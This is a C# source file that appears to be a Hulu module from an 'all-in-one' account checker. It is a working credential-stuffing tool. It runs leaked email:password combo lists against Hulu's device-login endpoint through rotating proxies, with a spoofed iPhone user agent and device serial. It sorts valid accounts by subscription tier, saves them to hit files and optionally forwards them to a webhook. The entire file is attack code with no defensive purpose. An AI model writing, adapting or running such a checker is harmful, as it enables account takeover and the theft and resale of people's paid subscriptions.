using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Hulumod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str1 = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=" + array[1] +
                                       "&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=" +
                                       array[0];
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var source = req.Post("https://auth.hulu.com/v1/device/password/authenticate", str1,
                                "application/x-www-form-urlencoded").ToString();
                            var flag = source.Contains("user_token");
                            if (!source.Contains("Your login is invalid"))
                            {
                                if (flag)
                                {
                                    var str2 = Parse(source, "user_token\":\"", "\",\"");
                                    req.AddHeader("Authorization", "Bearer " + str2);
                                    var str3 = req.Get("https://home.hulu.com/v1/users/self").ToString();
                                    if (str3.Contains("262144"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Hulu_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Hulu", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1], "Hulu Free");
                                    }

                                    if (str3.Contains("66536"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Hulu_hits", array[0] + ":" + array[1] + " | Hulu with ads");
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Hulu", array[0] + ":" + array[1] + " | Hulu with ads");
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Hulu with ads",
                                                "Hulu Hit");
                                    }

                                    if (str3.Contains("197608"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Hulu_hits", array[0] + ":" + array[1] + " | Hulu (No Ads)");
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Hulu", array[0] + ":" + array[1] + " | Hulu (No Ads)");
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Hulu (No Ads)",
                                                "Hulu Hit");
                                    }

                                    if (str3.Contains("459752"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Hulu_hits",
                                            array[0] + ":" + array[1] + " | Hulu (No Ads) + Showtime");
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Hulu",
                                                array[0] + ":" + array[1] + " | Hulu (No Ads) + Showtime");
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " | Hulu (No Ads) + Showtime", "Hulu Hit");
                                    }

                                    if (str3.Contains("1311769576"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Hulu_hits",
                                            array[0] + ":" + array[1] +
                                            " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®");
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Hulu",
                                                array[0] + ":" + array[1] +
                                                " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®");
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] +
                                                " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®",
                                                "Hulu Hit");
                                    }

                                    if (str3.Contains("1049576"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Hulu_hits",
                                            array[0] + ":" + array[1] + " |  Hulu + Live TV + HBO + CINEMAX");
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Hulu",
                                                array[0] + ":" + array[1] + " |  Hulu + Live TV + HBO + CINEMAX");
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " |  Hulu + Live TV + HBO + CINEMAX",
                                                "Hulu Hit");
                                        if (str3.Contains("200356"))
                                        {
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Hulu_hits",
                                                array[0] + ":" + array[1] + " |  Hulu (No Ads) Free Trial");
                                            if (Program.lorc == "LOG")
                                                Settings.PrintHit("Hulu",
                                                    array[0] + ":" + array[1] + " |  Hulu (No Ads) Free Trial");
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(
                                                    array[0] + ":" + array[1] + " |  Hulu (No Ads) Free Trial",
                                                    "Hulu Hit");
                                        }

                                        if (str3.Contains("70125"))
                                        {
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Hulu_hits",
                                                array[0] + ":" + array[1] + " |  Hulu + CINEMAXÂ®");
                                            if (Program.lorc == "LOG")
                                                Settings.PrintHit("Hulu",
                                                    array[0] + ":" + array[1] + " |  Hulu + CINEMAXÂ®");
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(
                                                    array[0] + ":" + array[1] + " |  Hulu + CINEMAXÂ®", "Hulu Hit");
                                        }
                                    }

                                    req.Dispose();
                                }
                                else
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                    req.Dispose();
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}